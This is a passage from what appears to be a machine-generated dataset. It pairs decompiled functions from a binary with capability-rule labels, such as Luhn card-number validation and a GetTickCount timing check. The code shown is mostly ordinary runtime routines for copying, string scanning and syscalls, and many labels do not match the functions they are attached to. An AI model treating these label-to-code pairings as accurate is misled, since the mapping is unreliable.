        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a9b3)\n\nuint fcn.0040a91d(ulong arg1, ulong *arg2, ulong *arg3)\n\n{\n    ulong uStack360;\n    uint uStack352;\n    ulong uStack344;\n    uchar auStack336 [136];\n    ulong uStack200;\n    int64_t iStack192;\n    ulong uStack184;\n    uchar auStack176 [144];\n    \n    if (arg2 != NULL) {\n        uStack200 = *arg2;\n        fcn.00408190(auStack176, arg2 + 1, 0x80);\n        uStack184 = 0x40a914;\n        iStack192 = *(arg2 + 0x11) | 0x4000000;\n    }\n    syscall();\n    if (arg3 != NULL) {\n        *arg3 = uStack360;\n        fcn.00408190(arg3 + 1, auStack336, 0x80);\n        *(arg3 + 0x11) = uStack352;\n        arg3[0x12] = uStack344;\n    }\n    return 0xd;\n}\n",
        "token_count": 256
    },
    "0040aab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040aad6)\n// WARNING: Removing unreachable block (ram,0x0040aae9)\n\nuint fcn.0040aab0(ulong arg1, ulong arg2)\n\n{\n    syscall();\n    return 5;\n}\n",
        "token_count": 61
    },
    "0040ac30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040ac30(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack24;\n    \n    iVar1 = fcn.0040ace0(7);\n    uVar2 = 0x100;\n    if (iVar1 != -1 && SCARRY4(iVar1, 1) == iVar1 + 1 < 0) {\n        uVar2 = uStack24;\n    }\n    return uVar2;\n}\n",
        "token_count": 104
    },
    "0040af30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0040af30(uchar *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uchar auStack56 [24];\n    uint *puStack32;\n    uint auStack24 [6];\n    \n    if (arg1 == NULL) {\n        arg2._0_4_ = 0;\n        arg1 = auStack56;\n    }\n    puStack32 = auStack24;\n    auStack24[0] = arg2;\n    iVar1 = fcn.0040af84(arg1, &puStack32, 1, 0x10);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 160
    },
    "0040b9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.0040b9d0(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    \n    if (0x20 < arg3) {\n        uVar4 = -arg1 & 7;\n        arg3 = arg3 - uVar4;\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *arg1 = *arg2;\n            arg2 = arg2 + 1;\n            arg1 = arg1 + 1;\n        }\n        while (-1 < arg3 - 0x20) {\n            uVar1 = arg2[1];\n            uVar2 = arg2[2];\n            uVar3 = arg2[3];\n            *arg1 = *arg2;\n            arg1[1] = uVar1;\n            arg1[2] = uVar2;\n            arg1[3] = uVar3;\n            arg2 = arg2 + 4;\n            arg1 = arg1 + 4;\n            arg3 = arg3 - 0x20;\n        }\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        *arg1 = *arg2;\n        arg2 = arg2 + 1;\n        arg1 = arg1 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 322
    },
    "0040bff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * fcn.0040bff8(int64_t arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint8_t *puVar3;\n    uint64_t uVar5;\n    ulong *puVar6;\n    ulong auStack256 [32];\n    uint8_t *puVar4;\n    \n    puVar6 = auStack256;\n    for (uVar5 = 0x20; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    do {\n        uVar1 = *arg2;\n        uVar2 = uVar5 & 0xffffffffffffff00;\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[1];\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[2];\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[3];\n        uVar5 = uVar2 | uVar1;\n        arg2 = arg2 + 4;\n        *(auStack256 + uVar5) = uVar1;\n    } while (uVar1 != 0);\n    puVar3 = arg1 + -4;\n    do {\n        puVar4 = puVar3;\n        puVar3 = puVar4 + 4;\n        uVar2 = uVar5 & 0xffffffffffffff00;\n        uVar5 = uVar2 | *puVar3;\n        if (*(auStack256 + uVar5) == *puVar3) goto code_r0x0040c074;\n        uVar5 = uVar2 | puVar4[5];\n        if (*(auStack256 + uVar5) == puVar4[5]) goto code_r0x0040c071;\n        uVar5 = uVar2 | puVar4[6];\n        if (*(auStack256 + uVar5) == puVar4[6]) goto code_r0x0040c06e;\n        uVar5 = uVar2 | puVar4[7];\n    } while (*(auStack256 + uVar5) != puVar4[7]);\n    puVar3 = puVar4 + 5;\ncode_r0x0040c06e:\n    puVar3 = puVar3 + 1;\ncode_r0x0040c071:\n    puVar3 = puVar3 + 1;\ncode_r0x0040c074:\n    if (uVar5 == '\\0') {\n        puVar3 = NULL;\n    }\n    return puVar3;\n}\n",
        "token_count": 676
    },
    "0040c088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0040c088(int64_t arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint8_t *puVar3;\n    uint64_t uVar5;\n    ulong *puVar6;\n    ulong auStack256 [32];\n    uint8_t *puVar4;\n    \n    puVar6 = auStack256;\n    for (uVar5 = 0x20; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    do {\n        uVar1 = *arg2;\n        uVar2 = uVar5 & 0xffffffffffffff00;\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[1];\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[2];\n        uVar5 = uVar2 | uVar1;\n        if (uVar1 == 0) break;\n        *(auStack256 + uVar5) = uVar1;\n        uVar1 = arg2[3];\n        uVar5 = uVar2 | uVar1;\n        arg2 = arg2 + 4;\n        *(auStack256 + uVar5) = uVar1;\n    } while (uVar1 != 0);\n    puVar3 = arg1 + -4;\n    do {\n        puVar4 = puVar3;\n        puVar3 = puVar4 + 4;\n        uVar5 = uVar5 & 0xffffffffffffff00;\n        if ((*(auStack256 + (uVar5 | *puVar3)) & *puVar3) == 0) goto code_r0x0040c104;\n        if ((*(auStack256 + (uVar5 | puVar4[5])) & puVar4[5]) == 0) goto code_r0x0040c101;\n        if ((*(auStack256 + (uVar5 | puVar4[6])) & puVar4[6]) == 0) goto code_r0x0040c0fe;\n        uVar5 = uVar5 | puVar4[7];\n    } while ((*(auStack256 + uVar5) & puVar4[7]) != 0);\n    puVar3 = puVar4 + 5;\ncode_r0x0040c0fe:\n    puVar3 = puVar3 + 1;\ncode_r0x0040c101:\n    puVar3 = puVar3 + 1;\ncode_r0x0040c104:\n    return puVar3 - arg1;\n}\n",
        "token_count": 654
    },
    "0040c1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c1d0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = segment.LOAD1;\n    pcVar1 = _segment.LOAD1;\n    if (_segment.LOAD1 != 0xffffffffffffffff) {\n        do {\n            pcVar2 = pcVar2 + -8;\n            (*pcVar1)();\n            pcVar1 = *pcVar2;\n        } while (pcVar1 != 0xffffffffffffffff);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00407c9c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar fcn.00407c9c(ulong arg1)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    \n    piVar1 = 0x40d038;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n        if (*piVar1 == arg1) break;\n    } while (0x40d020 < piVar1);\n    return *((piVar2 + -0x206811 >> 1) + 0x40d038);\n}\n",
        "token_count": 122
    },
    "00408100": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar  [16] fcn.00408100(ulong arg1, uint64_t arg2, uint64_t arg3, uint16_t *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint *puVar3;\n    ulong uStack40;\n    \n    if ((*arg4 & 0xc0) == 0xc0) {\ncode_r0x00408136:\n        if (arg3 != 0 && arg2 != 0) {\n            if (arg3 <= SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(arg2), 0)) {\n                uVar2 = fcn.0040b0a4(arg1, arg2 * arg3, arg4);\n                uVar2 = uVar2 / arg2;\n                goto code_r0x0040817e;\n            }\n            *arg4 = *arg4 | 8;\n            puVar3 = fcn.00406f98();\n            *puVar3 = 0x16;\n        }\n    }\n    else {\n        iVar1 = fcn.0040b1a8(arg4, 0x80);\n        if (iVar1 == 0) goto code_r0x00408136;\n    }\n    uVar2 = 0;\ncode_r0x0040817e:\n    return CONCAT88(uStack40, uVar2);\n}\n",
        "token_count": 313
    },
    "0040a4d4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar  [16] fcn.0040a4d4(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    ulong uStack8;\n    \n    if (0x95 < arg1) {\ncode_r0x0040a4f3:\n        puVar2 = fcn.00406f98();\n        *puVar2 = 0x16;\n        goto code_r0x0040a5e5;\n    }\n    // switch table (150 cases) at 0x40dbf8\n    switch(*(arg1 * 8 + 0x40dbf8)) {\n    case 0x40a4e9:\n        iVar3 = 1;\n        break;\n    case 0x40a4f3:\n        goto code_r0x0040a4f3;\n    case 0x40a503:\n        iVar3 = 0x20000;\n        break;\n    case 0x40a50d:\n        iVar3 = 100;\n        break;\n    case 0x40a517:\n        iVar3 = 0x10000;\n        break;\n    case 0x40a521:\n        iVar1 = fcn.0040ac30();\n        goto code_r0x0040a537;\n    case 0x40a528:\n        iVar3 = 6;\n        break;\n    case 0x40a532:\n        iVar1 = fcn.0040accc();\ncode_r0x0040a537:\n        iVar3 = iVar1;\n        break;\n    case 0x40a53e:\n        iVar3 = 0x8000;\n        break;\n    case 0x40a548:\n        iVar3 = 1000;\n        break;\n    case 0x40a552:\n        iVar3 = 0x4000;\n        break;\n    case 0x40a55c:\n        iVar3 = 0x1000;\n        break;\n    case 0x40a566:\n        iVar3 = 500;\n        break;\n    case 0x40a570:\n        iVar3 = 8;\n        break;\n    case 0x40a57a:\n        iVar3 = -0x80000000;\n        break;\n    case 0x40a586:\n        iVar3 = 0x40;\n        break;\n    case 0x40a590:\n        iVar3 = -0x8000;\n        break;\n    case 0x40a59c:\n        iVar3 = 0xffffffff;\n        break;\n    case 0x40a5a6:\n        iVar3 = 0xffff;\n        break;\n    case 0x40a5b0:\n        iVar3 = 9;\n        break;\n    case 0x40a5b7:\n        iVar1 = fcn.0040aa5c(1);\n        if (-1 < iVar1) goto code_r0x0040a5d7;\n    case 0x40a5e5:\ncode_r0x0040a5e5:\n        iVar3 = -1;\n        break;\n    case 0x40a5c9:\n        iVar3 = 0x7f;\n        break;\n    case 0x40a5d0:\n        iVar3 = 0x10;\n        break;\n    case 0x40a5d7:\ncode_r0x0040a5d7:\n        iVar3 = 0x30db0;\n        break;\n    case 0x40a5de:\n        iVar3 = 4;\n        break;\n    case 0x40a5eb:\n        iVar3 = 0x100;\n        break;\n    case 0x40a5f2:\n        iVar3 = 0x20;\n        break;\n    case 0x40a5f9:\n        iVar3 = 0x400;\n        break;\n    case 0x40a600:\n        iVar3 = 0x7fffffff;\n        break;\n    case 0x40a607:\n        iVar3 = -0x80;\n        break;\n    case 0x40a610:\n        iVar3 = 0x14;\n        break;\n    case 0x40a617:\n        iVar3 = 99;\n        break;\n    case 0x40a61e:\n        iVar3 = 0x800;\n        break;\n    case 0x40a625:\n        iVar3 = 0xff;\n        break;\n    case 0x40a62c:\n        iVar3 = 0x7fff;\n    }\n    return CONCAT88(uStack8, iVar3);\n}\n",
        "token_count": 1010
    },
    "0040be28": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar  [16] fcn.0040be28(uint64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    ulong uStack8;\n    \n    uVar2 = 0;\n    syscall();\n    *0x5115b0 = 0xc;\n    if (0xc < arg1) {\n        puVar1 = fcn.00406f98();\n        uVar2 = 0xffffffff;\n        *puVar1 = 0xc;\n    }\n    return CONCAT88(uStack8, uVar2);\n}\n",
        "token_count": 121
    },
    "00405d90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405d90(uchar *arg1, uchar *arg2, ulong arg3)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    \n    if (arg3 != 0) {\n        iVar2 = 0;\n        do {\n            uVar1 = *arg2;\n            iVar2 = iVar2 + 1;\n            arg2 = arg2 + 1;\n            *arg1 = uVar1;\n            arg1 = arg1 + 1;\n        } while (iVar2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00405db0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405db0(uchar *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    \n    if (arg2 != 0) {\n        iVar1 = 0;\n        do {\n            iVar1 = iVar1 + 1;\n            *arg1 = 0;\n            arg1 = arg1 + 1;\n        } while (iVar1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004068f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406915)\n\nvoid fcn.004068f8(ulong arg1)\n\n{\n    do {\n        syscall();\n    } while( true );\n}\n",
        "token_count": 43
    },
    "0040725f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.0040725f(ulong *arg1)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    ulong *puVar7;\n    \n    puVar6 = 0x40cf60;\n    puVar7 = arg1;\n    for (uVar4 = -arg1 & 7U; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (iVar5 = 8 - (-arg1 & 7U); -1 < iVar5; iVar5 = iVar5 + -0x20) {\n        uVar1 = puVar6[1];\n        uVar2 = puVar6[2];\n        uVar3 = puVar6[3];\n        *puVar7 = *puVar6;\n        puVar7[1] = uVar1;\n        puVar7[2] = uVar2;\n        puVar7[3] = uVar3;\n        puVar6 = puVar6 + 4;\n        puVar7 = puVar7 + 4;\n    }\n    for (iVar5 = iVar5 + 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 370
    },
    "0040726e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040726e(void)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    ushort *arg1;\n    \n    fcn.0040725f(0x50f0c0);\n    fcn.0040725f(0x50f100);\n    for (puVar3 = *0x50f0a8; arg1 = *0x50f0a8,  puVar3 != NULL; puVar3 = *(puVar3 + 0x1c)) {\n        iVar2 = fcn.0040a6ae(puVar3 + 0x2c);\n        if (iVar2 != 0) {\n            uVar1 = *(puVar3 + 4);\n            *puVar3 = 0x30;\n            *(puVar3 + 0x14) = uVar1;\n            *(puVar3 + 0x18) = uVar1;\n            *(puVar3 + 0xc) = uVar1;\n            *(puVar3 + 0x10) = uVar1;\n        }\n        *(puVar3 + 0x28) = 1;\n        fcn.0040725f(puVar3 + 0x2c);\n    }\n    for (; arg1 != NULL; arg1 = *(arg1 + 0x1c)) {\n        if ((*arg1 & 0x40) != 0) {\n            fcn.004072f8(arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "00407320": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar  [16] fcn.00407320(ulong arg1, ulong noname_1, int64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong uStack40;\n    uchar uStack25;\n    \n    uStack25 = noname_1;\n    for (iVar2 = arg3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        iVar1 = fcn.0040b0a4(&uStack25, 1, arg1);\n        if (iVar1 != 1) break;\n    }\n    return CONCAT88(uStack40, arg3 - iVar2);\n}\n",
        "token_count": 144
    },
    "0040a668": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a668(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 0;\n    while (iVar1 = iVar1 + -1,  iVar1 != -1) {\n        (**(segment.LOAD1 + iVar1 * 8))();\n    }\n    if (*0x511590 != NULL) {\n        (**0x511590)();\n    }\n    if (*0x511598 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0040a6a9. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x511598)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0040af74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0040af74(uint32_t **arg1, uint32_t **arg2, int64_t arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t *apuStack24 [3];\n    \n    iVar5 = 1;\n    if (arg1 == NULL || arg1 == arg2) {\n        if (arg1 == NULL) {\n            arg3 = -1;\n            iVar5 = 0;\n            arg1 = apuStack24;\n        }\n        else {\n            iVar5 = 0;\n            arg1 = apuStack24;\n        }\n    }\n    if (arg3 == -1) {\n        arg3 = -1;\n    }\n    puVar4 = *arg2;\n    iVar3 = arg3;\n    do {\n        if (iVar3 == 0) {\ncode_r0x0040affd:\n            if (arg1 != apuStack24) {\n                *arg2 = puVar4;\n            }\n            return arg3 - iVar3;\n        }\n        if (0x7f < *puVar4) {\n            puVar2 = fcn.00406f98();\n            *puVar2 = 0x54;\n            return -1;\n        }\n        cVar1 = *puVar4;\n        *arg1 = cVar1;\n        if (cVar1 == '\\0') {\n            puVar4 = NULL;\n            goto code_r0x0040affd;\n        }\n        puVar4 = puVar4 + 1;\n        iVar3 = iVar3 + -1;\n        arg1 = arg1 + iVar5;\n    } while( true );\n}\n",
        "token_count": 388
    }
}